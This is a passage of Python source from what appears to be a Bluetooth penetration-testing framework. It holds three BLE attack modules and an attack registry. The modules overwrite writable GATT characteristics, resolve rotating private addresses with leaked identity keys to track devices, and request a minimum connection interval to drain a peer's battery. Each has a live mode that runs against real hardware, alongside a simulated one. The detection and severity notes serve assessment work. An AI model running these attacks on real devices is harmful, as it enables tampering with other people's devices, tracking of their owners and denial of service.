        attempt = self._attempt(ctx, ap)
        target = self.target(ctx)
        device = self.sim_device(ctx)
        sock = self.socket(ctx)
        link = self.link(ctx, sock)
        rows: List[Dict[str, Any]] = []
        if device is not None:
            for row in device.gatt_rows():
                if row.get("kind") != "characteristic" or not row.get("writable"):
                    continue
                if int(row.get("uuid") or 0) in (0x2902, 0x2903):
                    continue
                before = bytes(row.get("value") or b"")
                write = _att_write(sock, link, row["handle"], self.MARKER)
                after = bytes(next((item["value"] for item in device.gatt_rows()
                                    if item["handle"] == row["handle"]), b""))
                rows.append({"handle": f"0x{row['handle']:04x}",
                             "name": row.get("name", ""),
                             "uuid": f"0x{int(row['uuid']):04x}",
                             "properties": row.get("properties", ""),
                             "before": before.hex()[:32], "after": after.hex()[:32],
                             "accepted": bool(write.get("accepted")),
                             "changed": after[:len(self.MARKER)] == self.MARKER
                             and after != before,
                             "error": write.get("error", "")})
        elif link is not None:
            rows = [{"handle": f"0x{entry['handle']:04x}", "name": "",
                     "uuid": f"0x{entry['uuid']:04x}", "accepted": None, "changed": None}
                    for entry in _enumerate(sock, link, 0x00)][:16]
        changed = [row for row in rows if row.get("changed")]
        refused = [row for row in rows if row.get("accepted") is False]
        if rows:
            detail = (f"{len(rows)} writeable characteristic(s) on {target}, "
                      f"{len(changed)} changed and read back"
                      + (": " + ", ".join(f"{row['name'] or row['uuid']} "
                                          f"({row['before']} → {row['after']})"
                                          for row in changed[:4]) if changed else "")
                      + (f"; {len(refused)} refused ({refused[0]['error']})"
                         if refused else ""))
        else:
            detail = f"no writeable characteristic answered on {target}"
        payload = {"target": target, "characteristics": rows, "changed": len(changed),
                   "marker": self.MARKER.hex(),
                   "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt,
                            f"BLE GATT hijack: {len(changed)} characteristic(s) changed on "
                            f"{target or 'the device'}", detail, payload,
                            severity="high" if changed else "info")


# --------------------------------------------------------------------------- #
# 7. the addresses that are not anonymous
# --------------------------------------------------------------------------- #


class BleIrkResolveAttack(_BleAttack):
    """Resolve rotating addresses back to a device — with the key that leaked.

    A resolvable private address is a device's answer to being tracked: it changes every
    fifteen minutes, and only the holder of the identity resolving key can tell that the
    new address is the same device.  The key is the whole of that security, and keys leak —
    the example in a vendor's own documentation, the one a stack ships with, the one a
    firmware dump published.  The attack scans, tests every address it heard against that
    dictionary with the specification's AES derivation, and reports the devices whose
    "anonymised" addresses are a fixed identifier after all.  A match here is arithmetic,
    not a heuristic: two 128-bit values did or did not encrypt the same random part into
    the same 24-bit hash.
    """

    name = "ble_irk_resolve"
    role = "le"
    label = "BLE identity resolution (rotating addresses, leaked IRKs)"
    category = "survey"
    noise = "quiet"
    impact = "info"
    finding_severity = "high"
    tool = "wifipilot blesim + bt.py (AES-128 identity resolution)"

    description = (
        "Collect the resolvable private addresses on air and test each one against the "
        "identity resolving keys that leak — vendor examples and stack defaults — using the "
        "specification's derivation (prand, then two AES-128 blocks).  A device that "
        "resolves is a device whose rotating addresses are a stable identifier: whoever "
        "holds the key can follow it, and the scan proves which key that is.")
    detection = (
        "Nothing on the device: the resolution is offline arithmetic over addresses anybody "
        "can receive.  That is the finding — the privacy control fails silently, and only a "
        "listener holding the key can tell one address from another.")
    devices = ("ble_sensor", "fitness_tracker", "bt_keyboard")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 3.0)
        from .. import blesim

        passes: List[List[str]] = []
        if getattr(ctx, "demo", False):
            airspace = _floor()
            for _round in range(3):
                passes.append([str(report.get("address") or "")
                               for report in airspace.scan()])
        else:
            sock = self.socket(ctx)
            heard: List[str] = []
            for event in bt.iter_hci_events(sock, seconds=seconds, limit=4000):
                for report in event.get("reports") or []:
                    if report.get("address"):
                        heard.append(str(report["address"]))
            passes.append(heard)
        identities: Dict[str, Dict[str, Any]] = {}
        seen: List[str] = []
        for addresses in passes:
            for address in addresses:
                if address not in seen:
                    seen.append(address)
                for match in blesim.resolve_address(address):
                    entry = identities.setdefault(match["irk"], {
                        "irk": match["irk"], "label": match["label"],
                        "addresses": []})
                    if address not in entry["addresses"]:
                        entry["addresses"].append(address)
        followed = [entry for entry in identities.values() if len(entry["addresses"]) >= 2]
        single = [entry for entry in identities.values() if len(entry["addresses"]) == 1]
        detail = (f"{len(seen)} address(es) heard over {len(passes)} scan(s), "
                  f"{len(identities)} resolved to a leaked key"
                  + (": " + ", ".join(f"{entry['label']} → {len(entry['addresses'])} "
                                      f"address(es) of one device"
                                      for entry in followed[:4]) if followed else "")
                  + (f"; {len(single)} key(s) matched a single address, which is not enough "
                     f"to call a device followed" if single else "")
                  + ("" if identities else "; every address on air either rotated under a "
                     f"key that is not in the dictionary or did not rotate at all"))
        payload = {"addresses": seen, "passes": passes,
                   "identities": list(identities.values()), "followed": len(followed),
                   "dictionary_size": len(blesim.IRK_DICTIONARY),
                   "keys": [{"label": entry["label"], "irk": entry["irk"]}
                            for entry in identities.values()],
                   "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt,
                            f"BLE identity resolution: {len(followed)} device(s) followed "
                            f"through changing addresses", detail, payload,
                            severity="high" if followed else "info")


# --------------------------------------------------------------------------- #
# 8. the link that was starved
# --------------------------------------------------------------------------- #


class BleConnParamHijackAttack(_BleAttack):
    """Connection parameters the peer did not ask for: starve the link instead.

    An LE connection runs at an interval the two sides agreed on, and a link-layer
    Connection Update Request can propose another one.  Proposing the shortest interval the
    specification defines with zero peripheral latency is the cheapest denial of service
    Bluetooth has: the peer has to be awake for every connection event, its radio never
    idles, and its battery pays for it.  A device that answers ``LL_CONNECTION_UPDATE_IND``
    accepted the new parameters; one that answers ``LL_REJECT_EXT_IND`` checked what it was
    being asked for, and that difference is what the attack reports.
    """

    name = "ble_conn_param_hijack"
    role = "le"
    label = "LE connection parameter hijack (link starvation)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    finding_severity = "medium"
    tool = "wifipilot bt.py (LL_CONNECTION_UPDATE_REQ over ACL)"

    description = (
        "Send a link-layer Connection Update Request that asks for the shortest interval "
        "the specification allows and zero latency, and read the peer's answer: an accepted "
        "update keeps the device's radio awake for every connection event, and a rejected "
        "one says the device checks what it is asked to accept.")
    detection = (
        "An LL_CONNECTION_UPDATE_REQ from a peer that was never paired, and a device whose "
        "radio stays busy: the host's own controller log carries the request, and the "
        "battery drain shows up long before anybody reads the log.")
    devices = ("bt_headset", "fitness_tracker", "ble_sensor")

    #: the requested parameters: 7.5 ms interval, no latency, 2 s supervision timeout —
    #: the shortest interval the specification defines, which is the point of the attack
    INTERVAL = 0x0006
    LATENCY = 0x0000
    SUPERVISION = 0x00C8

    def answer(self, payload: bytes) -> Dict[str, Any]:
        """Read the peer's reply to the update: applied, rejected, or nothing.

        The rejection is the interesting answer, and it comes with an error code —
        LL_REJECT_EXT_IND carries the opcode it is rejecting and then why, and "invalid
        LL parameters" is a controller saying it will not run at the interval it was
        offered.
        """
        opcode = payload[0] if payload else 0
        return {"opcode": f"0x{opcode:02x}" if payload else "",
                "answer": bt.LL_CONTROL_OPCODES.get(opcode, "no answer") if payload else "",
                "error": bt.hci_status_name(payload[2]) if (opcode == 0x11
                                                            and len(payload) >= 3) else "",
                "accepted": opcode == 0x00}

    def request(self) -> bytes:
        """The LL_CONNECTION_UPDATE_REQ PDU on its own, as a bare ACL payload."""
        return bytes([0x00]) + struct.pack("<HHHHH", self.INTERVAL, self.INTERVAL,
                                           self.LATENCY, self.SUPERVISION, 0x0000)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        sock = self.socket(ctx)
        request = self.request()
        answers: List[Dict[str, Any]] = []
        if getattr(ctx, "demo", False):
            from .. import blesim
            airspace = _floor()
            device = self.sim_device(ctx)
            # the run's own target first, then the rest of the LE floor: a report that
            # only ever meets devices that accept cannot show which ones refuse
            pool = list(airspace.candidates("le"))
            candidates = [device] if device is not None else []
            # the weakest few *and* the strongest few: a probe that only ever meets the
            # permissive end of the floor cannot show which devices refuse, which is the
            # half of a denial-of-service finding that decides whether it is one
            for other in pool[:4] + pool[-3:]:
                if other not in candidates:
                    candidates.append(other)
            candidates = [entry for entry in candidates if entry is not None][:8]
            for candidate in candidates:
                if candidate is None:
                    continue
                link = airspace.link_for(candidate.address, "le")
                probe = blesim.controller_socket(None, address=candidate.address, role="le")
                if link is None or probe is None:
                    continue
                reply = bt.hci_send(probe, bt.acl_packet(link.handle, request), timeout=0.6)
                payload = bt.parse_acl_packet(reply or b"").get("payload") or b""
                answers.append({"address": candidate.address, "name": candidate.name,
                                "profile": candidate.profile,
                                "request": request.hex(),
                                **self.answer(payload)})
        elif sock is not None:
            link = _LiveLink(sock, self.target(ctx))
            reply = bt.hci_send(sock, bt.acl_packet(link.handle, request), timeout=1.0)
            payload = bt.parse_acl_packet(reply or b"").get("payload") or b""
            answers.append({"address": self.target(ctx), **self.answer(payload)})
        accepted = [row for row in answers if row["accepted"]]
        rejected = [row for row in answers if not row["accepted"] and row["opcode"]]
        detail = (f"connection update request sent to {len(answers)} device(s): "
                  f"{len(accepted)} accepted the {self.INTERVAL * 1.25:.1f} ms interval"
                  + (f" ({', '.join(row['name'] or row['address'] for row in accepted[:4])})"
                     if accepted else "")
                  + (f"; {len(rejected)} rejected it, which is what a device that checks its "
                     f"parameters does" if rejected else ""))
        payload = {"answers": answers, "accepted": len(accepted),
                   "requested": {"interval_ms": self.INTERVAL * 1.25,
                                 "latency": self.LATENCY,
                                 "supervision_ms": self.SUPERVISION * 10},
                   "request_hex": request.hex(),
                   "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt,
                            f"LE connection parameter hijack: {len(accepted)} of "
                            f"{len(answers)} accepted", detail, payload,
                            severity="medium" if accepted else "info")


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    BleHidAttack, BleHidAuditAttack, BleHidBootAttack, BleHidReconnectAttack,
    BleSmpDowngradeAttack, BleGattHijackAttack, BleIrkResolveAttack,
    BleConnParamHijackAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: what the catalogue, the planner and the docs read
META: Dict[str, Dict[str, Any]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {
        "category": getattr(_cls, "category", "rogue"),
        "noise": getattr(_cls, "noise", "moderate"),
        "impact": getattr(_cls, "impact", "loot"),
        "detection": getattr(_cls, "detection", "") or "the peer's own controller log",
        "domain": "bluetooth",
        "devices": list(getattr(_cls, "devices", ())),
        "port": 0, "protocol": "ble",
        "technique": "hid" if "hid" in _cls.name else "ble",
        "severity": getattr(_cls, "finding_severity", "medium"),
    }

REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
